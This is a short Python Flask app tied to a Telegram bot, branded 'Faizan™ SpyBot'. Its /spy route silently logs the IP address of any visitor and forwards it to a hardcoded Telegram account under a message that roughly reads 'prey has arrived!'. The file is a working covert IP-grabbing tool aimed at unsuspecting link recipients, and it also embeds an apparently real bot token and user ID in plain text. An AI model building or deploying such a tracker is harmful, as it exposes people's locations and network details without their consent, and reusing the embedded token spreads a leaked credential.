from flask import Flask, request
import telebot

TOKEN = "7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg"
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

YOUR_TELEGRAM_ID = 6908281054

@app.route('/' + TOKEN, methods=['POST'])
def getMessage():
    json_str = request.get_data().decode('UTF-8')
    update = telebot.types.Update.de_json(json_str)
    bot.process_new_updates([update])
    return "OK", 200

@app.route('/spy')
def spy():
    ip = request.remote_addr
    msg = f"👁️ شکار آیا!\nIP Address: {ip}"
    bot.send_message(YOUR_TELEGRAM_ID, msg)
    return "📡 Spy data sent to Faizan!", 200

@bot.message_handler(commands=['start'])
def welcome(message):
    bot.reply_to(message, "👋 Faizan™ SpyBot میں خوش آمدید!")

if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
